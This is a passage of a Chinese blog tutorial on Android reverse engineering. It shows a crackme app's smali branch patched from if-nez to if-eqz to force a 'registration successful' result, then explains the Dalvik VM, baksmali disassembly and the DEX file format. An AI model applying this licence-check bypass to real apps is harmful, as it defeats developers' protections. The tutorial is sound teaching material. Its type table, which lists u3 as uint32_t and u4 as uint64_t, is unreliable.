继续往下执行就会执行到0x7f0e006d的地方，也就是注册失败。所以一定要跳到:cond_0</span><br><span class="line"># 将if-nez修改为if-eqz</span><br><span class="line">    .line 30</span><br><span class="line">    iget-object v0, p0, Lcom/example/crackme/MainActivity$1;-&gt;this$0:Lcom/example/crackme/MainActivity;</span><br><span class="line"></span><br><span class="line">    const v2, 0x7f0e006d # unsuccessed</span><br><span class="line"></span><br><span class="line">    invoke-static &#123;v0, v2, v1&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;II)Landroid/widget/Toast;</span><br><span class="line"></span><br><span class="line">    move-result-object v0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v0&#125;, Landroid/widget/Toast;-&gt;show()V</span><br><span class="line"></span><br><span class="line">    goto :goto_0</span><br><span class="line"></span><br><span class="line">    .line 33</span><br><span class="line">    :cond_0</span><br><span class="line">    iget-object v0, p0, Lcom/example/crackme/MainActivity$1;-&gt;this$0:Lcom/example/crackme/MainActivity;</span><br><span class="line"></span><br><span class="line">    const v2, 0x7f0e006b # successed</span><br><span class="line"></span><br><span class="line">    invoke-static &#123;v0, v2, v1&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;II)Landroid/widget/Toast;</span><br><span class="line"></span><br><span class="line">    move-result-object v0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v0&#125;, Landroid/widget/Toast;-&gt;show()V</span><br><span class="line"></span><br><span class="line">    .line 34</span><br><span class="line">    iget-object v0, p0, Lcom/example/crackme/MainActivity$1;-&gt;val$btn_register:Landroid/widget/Button;</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v0, v1&#125;, Landroid/widget/Button;-&gt;setEnabled(Z)V</span><br><span class="line"></span><br><span class="line">    .line 35</span><br><span class="line">    iget-object v0, p0, Lcom/example/crackme/MainActivity$1;-&gt;this$0:Lcom/example/crackme/MainActivity;</span><br><span class="line"></span><br><span class="line">    const v1, 0x7f0e0068 # registered</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v0, v1&#125;, Lcom/example/crackme/MainActivity;-&gt;setTitle(I)V</span><br><span class="line"></span><br><span class="line">    .line 37</span><br><span class="line">    :goto_0</span><br><span class="line">    return-void</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><p>修改完后保存，使用Apktool编译。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool b app-debug</span><br></pre></td></tr></table></figure><p>天啊编译完还要签名，还要配置签名工具。答应我，用AK就好，点击“编译”它就会自动编译并签名，很方便。</p><img src="/posts/d368aa06/2.2.3.png" class="" title="查找0x7f0e006d"><img src="/posts/d368aa06/2.2.4.png" class="" title="注册成功"><h1 id="3-进入Android-Dalvik虚拟机"><a href="#3-进入Android-Dalvik虚拟机" class="headerlink" title="3. 进入Android Dalvik虚拟机"></a>3. 进入Android Dalvik虚拟机</h1><h2 id="3-1-Dalvik虚拟机与Java虚拟机的区别"><a href="#3-1-Dalvik虚拟机与Java虚拟机的区别" class="headerlink" title="3.1 Dalvik虚拟机与Java虚拟机的区别"></a>3.1 Dalvik虚拟机与Java虚拟机的区别</h2><p>Dalvik虚拟机与传统的Java虚拟机有着许多不同点，两者并不兼容，它们显著的不同点主要表现在以下几个方面：</p><ul><li><p>Java虚拟机运行的是Java字节码，Dalvik虚拟机运行的是Dalvik字节码。</p><p>传统的Java程序经过编译，生成Java字节码保存在class文件中，Java虚拟机通过解码class文件中的内容来运行程序。而Dalvik虚拟机运行的是Dalvik字节码，所有的Dalvik字节码由Java字节码转换而来，并被打包到一个DEX(Dalvik Executable)可执行文件中，Dalvik虚拟机通过解释DEX文件来执行这些字节码。</p></li><li><p>Dalvik可执行文件体积更小。</p><p>Android SDK中有一个叫dx(现名为d8)的工具负责将Java字节码转换为Dalvik字节码。dx工具对Java常量池的压缩，使得相同的字符串、常量在DEX文件中只出现一次，从而减少了文件的体积。</p><img src="/posts/d368aa06/3.1.1.png" class="" title="Java文件转换为DEX文件"></li><li><p>Java虚拟机与Dalvik虚拟机架构不同。</p><p>Java虚拟机基于栈架构。程序在运行时虚拟机需要频繁地从栈上读取或写入数据，这个过程需要更多的指令分派与内存访问次数。</p><p>Dalvik虚拟机基于寄存器架构。数据的访问通过寄存器间直接传递。</p></li></ul><p>编写简单的Java代码来对比Java字节码与Dalvik字节码的区别：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Hello.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">foo</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">return</span> (a + b) * (a - b);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line">        System.out.println(hello.foo(<span class="number">5</span>, <span class="number">3</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成class文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Hello.java</span><br></pre></td></tr></table></figure><p>编译<code>Hello.class</code>生成Java字节码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\dell\Desktop&gt; javap -c Hello.class</span><br><span class="line">Compiled from &quot;Hello.java&quot;</span><br><span class="line">public class Hello &#123;</span><br><span class="line">  public Hello();</span><br><span class="line">    Code:</span><br><span class="line">       0: aload_0</span><br><span class="line">       1: invokespecial #1                  // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">       4: return</span><br><span class="line"></span><br><span class="line">  public int foo(int, int);</span><br><span class="line">    Code:</span><br><span class="line">       0: iload_1</span><br><span class="line">       1: iload_2</span><br><span class="line">       2: iadd</span><br><span class="line">       3: iload_1</span><br><span class="line">       4: iload_2</span><br><span class="line">       5: isub</span><br><span class="line">       6: imul</span><br><span class="line">       7: ireturn</span><br><span class="line"></span><br><span class="line">  public static void main(java.lang.String[]);</span><br><span class="line">    Code:</span><br><span class="line">       0: new           #2                  // class Hello</span><br><span class="line">       3: dup</span><br><span class="line">       4: invokespecial #3                  // Method &quot;&lt;init&gt;&quot;:()V</span><br><span class="line">       7: astore_1</span><br><span class="line">       8: getstatic     #4                  // Field java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">      11: aload_1</span><br><span class="line">      12: iconst_5</span><br><span class="line">      13: iconst_3</span><br><span class="line">      14: invokevirtual #5                  // Method foo:(II)I</span><br><span class="line">      17: invokevirtual #6                  // Method java/io/PrintStream.println:(I)V</span><br><span class="line">      20: return</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将class文件编译成DEX文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar dx.jar --dex --output=Hello.dex Hello.class</span><br></pre></td></tr></table></figure><blockquote><p>运行jar包命令：java -jar xxx.jar</p></blockquote><p>使用<code>dexdump.exe</code>将<code>Hello.dex</code>文件编译成Dalvik字节码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">PS D:\Java\Android\sdk\build-tools\30.0.3&gt; .\dexdump.exe -d C:\Users\Dell\Desktop\Hello.dex</span><br><span class="line">Processing &#x27;C:\Users\Dell\Desktop\Hello.dex&#x27;...</span><br><span class="line">Opened &#x27;C:\Users\Dell\Desktop\Hello.dex&#x27;, DEX version &#x27;035&#x27;</span><br><span class="line">Class #0            -</span><br><span class="line">  Class descriptor  : &#x27;LHello;&#x27;</span><br><span class="line">  Access flags      : 0x0001 (PUBLIC)</span><br><span class="line">  Superclass        : &#x27;Ljava/lang/Object;&#x27;</span><br><span class="line">  Interfaces        -</span><br><span class="line">  Static fields     -</span><br><span class="line">  Instance fields   -</span><br><span class="line">  Direct methods    -</span><br><span class="line">    #0              : (in LHello;)</span><br><span class="line">      name          : &#x27;&lt;init&gt;&#x27;</span><br><span class="line">      type          : &#x27;()V&#x27;</span><br><span class="line">      access        : 0x10001 (PUBLIC CONSTRUCTOR)</span><br><span class="line">      code          -</span><br><span class="line">      registers     : 1</span><br><span class="line">      ins           : 1</span><br><span class="line">      outs          : 1</span><br><span class="line">      insns size    : 4 16-bit code units</span><br><span class="line">00014c:                                        |[00014c] Hello.&lt;init&gt;:()V</span><br><span class="line">00015c: 7010 0400 0000                         |0000: invoke-direct &#123;v0&#125;, Ljava/lang/Object;.&lt;init&gt;:()V // method@0004</span><br><span class="line">000162: 0e00                                   |0003: return-void</span><br><span class="line">      catches       : (none)</span><br><span class="line">      positions     :</span><br><span class="line">        0x0000 line=1</span><br><span class="line">      locals        :</span><br><span class="line">        0x0000 - 0x0004 reg=0 this LHello;</span><br><span class="line"></span><br><span class="line">    #1              : (in LHello;)</span><br><span class="line">      name          : &#x27;main&#x27;</span><br><span class="line">      type          : &#x27;([Ljava/lang/String;)V&#x27;</span><br><span class="line">      access        : 0x0009 (PUBLIC STATIC)</span><br><span class="line">      code          -</span><br><span class="line">      registers     : 5</span><br><span class="line">      ins           : 1</span><br><span class="line">      outs          : 3</span><br><span class="line">      insns size    : 17 16-bit code units</span><br><span class="line">000164:                                        |[000164] Hello.main:([Ljava/lang/String;)V</span><br><span class="line">000174: 2200 0100                              |0000: new-instance v0, LHello; // type@0001</span><br><span class="line">000178: 7010 0000 0000                         |0002: invoke-direct &#123;v0&#125;, LHello;.&lt;init&gt;:()V // method@0000</span><br><span class="line">00017e: 6201 0000                              |0005: sget-object v1, Ljava/lang/System;.out:Ljava/io/PrintStream; // field@0000</span><br><span class="line">000182: 1252                                   |0007: const/4 v2, #int 5 // #5</span><br><span class="line">000184: 1233                                   |0008: const/4 v3, #int 3 // #3</span><br><span class="line">000186: 6e30 0100 2003                         |0009: invoke-virtual &#123;v0, v2, v3&#125;, LHello;.foo:(II)I // method@0001</span><br><span class="line">00018c: 0a00                                   |000c: move-result v0</span><br><span class="line">00018e: 6e20 0300 0100                         |000d: invoke-virtual &#123;v1, v0&#125;, Ljava/io/PrintStream;.println:(I)V // method@0003</span><br><span class="line">000194: 0e00                                   |0010: return-void</span><br><span class="line">      catches       : (none)</span><br><span class="line">      positions     :</span><br><span class="line">        0x0000 line=9</span><br><span class="line">        0x0005 line=10</span><br><span class="line">        0x0010 line=11</span><br><span class="line">      locals        :</span><br><span class="line">        0x0000 - 0x0011 reg=4 (null) [Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">  Virtual methods   -</span><br><span class="line">    #0              : (in LHello;)</span><br><span class="line">      name          : &#x27;foo&#x27;</span><br><span class="line">      type          : &#x27;(II)I&#x27;</span><br><span class="line">      access        : 0x0001 (PUBLIC)</span><br><span class="line">      code          -</span><br><span class="line">      registers     : 5</span><br><span class="line">      ins           : 3</span><br><span class="line">      outs          : 0</span><br><span class="line">      insns size    : 6 16-bit code units</span><br><span class="line">000198:                                        |[000198] Hello.foo:(II)I</span><br><span class="line">0001a8: 9000 0304                              |0000: add-int v0, v3, v4</span><br><span class="line">0001ac: 9101 0304                              |0002: sub-int v1, v3, v4</span><br><span class="line">0001b0: b210                                   |0004: mul-int/2addr v0, v1</span><br><span class="line">0001b2: 0f00                                   |0005: return v0</span><br><span class="line">      catches       : (none)</span><br><span class="line">      positions     :</span><br><span class="line">        0x0000 line=5</span><br><span class="line">      locals        :</span><br><span class="line">        0x0000 - 0x0006 reg=2 this LHello;</span><br><span class="line">        0x0000 - 0x0006 reg=3 (null) I</span><br><span class="line">        0x0000 - 0x0006 reg=4 (null) I</span><br><span class="line"></span><br><span class="line">  source_file_idx   : 1 (Hello.java)</span><br></pre></td></tr></table></figure><p>可以看到，它们用各自的字节码描述<code>foo()</code>函数，Java需要8条指令，而Dalivik只需4条指令。</p><h2 id="3-2-Android系统架构"><a href="#3-2-Android系统架构" class="headerlink" title="3.2 Android系统架构"></a>3.2 Android系统架构</h2><p>Android系统架构采用分层思想，这样的好处是拥有减少各层之间的依赖性、便于独立分发、容易收敛问题和错误等优点。Android系统由Linux内核、函数库、Android运行时、应用程序框架、应用程序组成。Dalvik虚拟机属于Android运行时环境，它与一些核心库共同承担Android应用程序的运行工作。</p><img src="/posts/d368aa06/3.1.2.png" class="" title="Android系统架构"><p>Android系统启动加载完内核后，第一个执行的是init进程，init进程首先要做的是设备的初始化工作，然后读取<code>inic.rc</code>文件并启动系统中的重要外部程序Zygote。Zygote进程是Android所有进程的孵化器进程，它启动后会首先初始化Dalvik虚拟机，然后启动system_server并进入Zygote模式，通过socket等候命令。当执行一个Android应用程序时，system_server进程通过socket方式发送命令给Zygote，Zygote收到命令后通过fork自身创建一个Dalvik虚拟机的实例来执行应用程序的入口函数，这样一个程序就启动完成了。</p><p>Zygote提供了三种创建进程的方法：</p><ul><li>fork()，创建一个Zygote进程；</li><li>forkAndSpecialize()，创建一个非Zygote进程；</li><li>forSystemServer()，创建一个系统服务进程。</li></ul><p>当进程fork成功后，执行的工作就交给了Dalvik虚拟机。Dalvik虚拟机首先通过<code>loadClassFromDex()</code>函数完成类的装载工作，每个类被成功解析后都会拥有一个ClassObject类型的数据结构存储在运行时环境中，虚拟机使用gDvm.loadedClasses全局哈希表来存储与查询所有装载进来的类，字节码验证器使用<code>dvmVerifyCodeFlow()</code>函数对装入的代码进行校验，接着虚拟机调用<code>FindClass()</code>函数查找并装载main方法类，随后调用<code>dvmInterpret()</code>函数初始化解释器并执行字节码流。</p><h2 id="3-3-DEX文件反汇编"><a href="#3-3-DEX文件反汇编" class="headerlink" title="3.3 DEX文件反汇编"></a>3.3 DEX文件反汇编</h2><p>DEX文件的反汇编工具我们用BakSmali，BakSmali提供反汇编功能的同时，还支持使用Smali工具打包反汇编代码重新生成DEX文件，这个功能被广泛应用于APK文件的修改、补丁、破解等场合。（如果是class文件转换为DEX文件可用<code>dx.jar</code>或<code>smali.jar</code>工具）</p><p>反汇编DEX文件，在baksmaliout目录下生成<code>Hello.smali</code>文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar baksmali.jar d -o baksmaliout Hello.dex</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">.class public LHello;</span><br><span class="line">.super Ljava/lang/Object;</span><br><span class="line">.source &quot;Hello.java&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># direct methods</span><br><span class="line">.method public constructor &lt;init&gt;()V</span><br><span class="line">    .registers 1</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line 1</span><br><span class="line">    invoke-direct &#123;p0&#125;, Ljava/lang/Object;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    return-void</span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line">.method public static main([Ljava/lang/String;)V</span><br><span class="line">    .registers 5</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line 9</span><br><span class="line">    new-instance v0, LHello;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v0&#125;, LHello;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    .line 10</span><br><span class="line">    sget-object v1, Ljava/lang/System;-&gt;out:Ljava/io/PrintStream;</span><br><span class="line"></span><br><span class="line">    const/4 v2, 0x5</span><br><span class="line"></span><br><span class="line">    const/4 v3, 0x3</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v0, v2, v3&#125;, LHello;-&gt;foo(II)I</span><br><span class="line"></span><br><span class="line">    move-result v0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v1, v0&#125;, Ljava/io/PrintStream;-&gt;println(I)V</span><br><span class="line"></span><br><span class="line">    .line 11</span><br><span class="line">    return-void</span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># virtual methods</span><br><span class="line">.method public foo(II)I</span><br><span class="line">    .registers 5</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line 5</span><br><span class="line">    add-int v0, p1, p2</span><br><span class="line"></span><br><span class="line">    sub-int v1, p1, p2</span><br><span class="line"></span><br><span class="line">    mul-int/2addr v0, v1</span><br><span class="line"></span><br><span class="line">    return v0</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><p>有关Smali与Dalvik的语法知识可以看我之前写的一篇笔记<a href="https://v5le0n9.github.io/posts/15be101a.html#1-%E5%88%9D%E8%AF%86APK%E3%80%81Dalvik%E5%AD%97%E8%8A%82%E7%A0%81%E4%BB%A5%E5%8F%8ASmali">初识APK、Dalvik字节码以及Smali</a>，虽然不全但应该够用。</p><h1 id="4-Android可执行文件"><a href="#4-Android可执行文件" class="headerlink" title="4. Android可执行文件"></a>4. Android可执行文件</h1><p>DEX文件是由Java代码编译得到的Dalvik虚拟机能直接执行的文件。分析Android程序大多数时候是在和DEX文件打交道。</p><h2 id="4-1-Android程序的生成步骤"><a href="#4-1-Android程序的生成步骤" class="headerlink" title="4.1 Android程序的生成步骤"></a>4.1 Android程序的生成步骤</h2><ol><li>打包资源文件，生成<code>R.java</code>文件；</li><li>处理aidl文件，生成相应的Java文件；</li><li>编译工程源码，生成相应的class文件；</li><li>转换所有的class文件，生成<code>classes.dex</code>文件；</li><li>打包生成APK文件；</li><li>对APK文件进行签名；</li><li>对签名后的APK文件进行对齐处理。</li></ol><h2 id="4-2-DEX文件格式"><a href="#4-2-DEX文件格式" class="headerlink" title="4.2 DEX文件格式"></a>4.2 DEX文件格式</h2><p>DEX文件使用到的数据类型：</p><div class="table-container"><table><thead><tr><th>类型</th><th>含义</th></tr></thead><tbody><tr><td>u1</td><td>等同于uint8_t，1字节的无符号数</td></tr><tr><td>u2</td><td>等同于uint16_t，2字节的无符号数</td></tr><tr><td>u3</td><td>等同于uint32_t，4字节的无符号数</td></tr><tr><td>u4</td><td>等同于uint64_t，8字节的无符号数</td></tr><tr><td>sleb128</td><td>有符号LEB128，可变长度1~5字节</td></tr><tr><td>uleb128</td><td>无符号LEB128，可变长度1~5字节</td></tr><tr><td>uleb128p1</td><td>无符号LEB128值加1，可变长度1~5字节</td></tr></tbody></table></div><p>sleb128、uleb128、uleb128p1是DEX文件中特有的LEB128数据类型。其中每个LEB128由1~5个字节组成，所有的字节组合在一起表示一个32位的数据。</p><img src="/posts/d368aa06/4.2.1.png" class="" title="LEB128数据类型"><p>每个字节只有7位有效位，如果第1个字节的最高位为1，标识LEB128需要用到第2个字节，如果第2个字节的最高位为1，表示会用到第3个字节，以此类推，直到最后的字节最高位为0。LEB128最多只会使用到5个字节，如果第5个字节的最高位仍为1，表示该DEX文件无效，Dalvik虚拟机在验证DEX文件时会失败返回。</p><p>DEX文件是由多个结构体组合而成。一个DEX文件由9部分组成，分别为dex header、string_ids、type_ids、proto_ids、field_ids、method_ids、class_def、data、link_data。</p><img src="/posts/d368aa06/4.2.4.png" class="" title="DEX文件结构"><h3 id="4-2-1-dex-header"><a href="#4-2-1-dex-header" class="headerlink" title="4.2.1 dex header"></a>4.2.1 dex header</h3><p>dex header指定了DEX文件的一些属性，并记录了其它8部分数据结构在DEX文件中的物理偏移与大小。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexHeader</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u1      magic[<span class="number">8</span>];<span class="comment">//魔数，标识DEX文件</span></span><br><span class="line">    u4      checksum; <span class="comment">//adler32校验</span></span><br><span class="line">    u1      signature[kSHA1DigestLen];<span class="comment">//SHA-1哈希值 </span></span><br><span class="line">    u4      file_size; <span class="comment">//DEX文件大小</span></span><br><span class="line">    u4      header_size; <span class="comment">//DexHeader大小</span></span><br><span class="line">    u4      endian_tag; <span class="comment">//字节序标记</span></span><br><span class="line">    u4      link_size; <span class="comment">//链接段大小</span></span><br><span class="line">    u4      link_off; <span class="comment">//链接段偏移</span></span><br><span class="line">    u4      map_off;<span class="comment">//DexMapList的文件偏移</span></span><br><span class="line">    u4      string_ids_size; <span class="comment">//DexStringId的个数</span></span><br><span class="line">    u4      string_ids_off; <span class="comment">//DexStringId的文件偏移</span></span><br><span class="line">    u4      type_ids_size; <span class="comment">//DexTypeId的个数</span></span><br><span class="line">    u4      type_ids_off; <span class="comment">//DexTypeId的文件偏移</span></span><br><span class="line">    u4      proto_ids_size; <span class="comment">//DexProtoId的个数</span></span><br><span class="line">    u4      proto_ids_off; <span class="comment">//DexProtoId的文件偏移</span></span><br><span class="line">    u4      field_ids_size;<span class="comment">//DexFieldId的个数</span></span><br><span class="line">    u4      field_ids_off;<span class="comment">//DexFieldId的文件偏移</span></span><br><span class="line">    u4      method_ids_size; <span class="comment">//DexMethodId的个数</span></span><br><span class="line">    u4      method_ids_off; <span class="comment">//DexMethodId的文件偏移</span></span><br><span class="line">    u4      class_defs_size; <span class="comment">//DexClassDef的个数</span></span><br><span class="line">    u4      class_defs_off; <span class="comment">//DexClassDef的文件偏移</span></span><br><span class="line">    u4      data_size;<span class="comment">//数据段的大小</span></span><br><span class="line">    u4      data_off; <span class="comment">//数据段的文件偏移</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>magic：表示了一个有效的DEX文件，目前它的值固定为64 65 78 0a 30 33 35 00。</li><li>checksum：DEX文件的校验和，通过它来判断DEX文件是否被损坏或篡改。</li><li>signature：识别最佳化之前的DEX文件。</li><li>header_size：记录了DexHeader结构本身占用的字节数，为0x70。</li><li>endian_tag：指定了dex运行环境的cpu字节序，预设值ENDIAN_CONSTANT等于0x12345678，默认采用Little-Endian字节序。</li><li>link_size和link_off：指定链接段的大小与文件偏移，大多数情况下它们的值都为0。</li><li>map_off：指定了DexMapList结构的文件偏移。</li></ul><img src="/posts/d368aa06/4.2.2.png" class="" title="DEX文件格式"><h3 id="4-2-2-DexMapList"><a href="#4-2-2-DexMapList" class="headerlink" title="4.2.2 DexMapList"></a>4.2.2 DexMapList</h3><p>Dalvik虚拟机解析DEX文件的内容，最终将其映射成DexMapList数据结构。DexHeader结构的map_off字段指明了DexMapList结构在DEX文件中的偏移。</p><p>DexMapList数据结构声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexMapList</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u4    size;<span class="comment">//DexMapItem的个数</span></span><br><span class="line">    DexMapItem    <span class="built_in">list</span>[<span class="number">1</span>];<span class="comment">//DexMapItem结构</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>size字段表示接下来有多少个DexMapItem结构，它的声明如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexMapItem</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u2    type;<span class="comment">//kDexType开头的类型</span></span><br><span class="line">    u2    unused;<span class="comment">//未使用，用于字节对齐</span></span><br><span class="line">    u4    size;<span class="comment">//指定类型的个数</span></span><br><span class="line">    u4    offset;<span class="comment">//指定类型数据的文件偏移</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>type字段为一个枚举常量，通过类型名称很容易判断它的具体类型。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    kDexTypeHeaderItem= <span class="number">0x0000</span>,</span><br><span class="line">    kDexTypeStringIdItem= <span class="number">0x0001</span>,</span><br><span class="line">    kDexTypeTypeIdItem= <span class="number">0x0002</span>,</span><br><span class="line">    kDexTypeProtoIdItem= <span 